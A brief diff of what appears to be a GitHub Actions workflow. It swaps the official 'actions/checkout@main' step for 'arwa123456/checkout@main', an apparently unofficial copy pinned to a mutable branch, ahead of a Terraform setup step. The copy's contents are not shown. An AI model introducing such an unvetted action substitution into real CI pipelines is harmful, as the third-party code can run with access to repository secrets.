@@ -15,7 +15,7 @@ shell: bash
 steps:
 # Checkout the repository to the GitHub Actions runner
 - name: Checkout
-uses: actions/checkout@main
+uses: arwa123456/checkout@main
 - name: Setup Terraform
 uses: hashicorp/setup-terraform@v1
 with:
